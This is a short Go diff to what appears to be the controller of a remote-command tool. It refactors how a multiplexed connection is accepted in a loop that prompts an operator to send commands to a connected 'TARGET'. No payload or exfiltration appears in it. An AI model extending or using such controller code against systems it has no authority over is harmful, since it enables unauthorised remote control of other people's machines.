@@ -69,6 +69,14 @@ func handleClient(conn net.Conn) {
 		_ = conn.Close()
 	}
 	defer cleanup()
+	var recvconn net.Conn
+	recvconn, err = ymserv.Accept()
+	if err != nil {
+		log.Fatalln("Mux Error.")
+	}
+	defer func() {
+		_ = recvconn.Close()
+	}()
 	for true {
 		fmt.Printf("[ TARGET %s ] [>_] Controller $ ", conn.RemoteAddr().String())
 		useript := utils.ReadUserInput()
@@ -81,11 +89,6 @@ func handleClient(conn net.Conn) {
 			continue
 		} else if userCmd == nil {
 			continue
-		}
-		recvconn, err := ymserv.Accept()
-		if err != nil {
-			log.Println("Mux Error.")
-			break
 		}
 		err = userCommandProcess(userCmd, recvconn)
 		if err != nil {
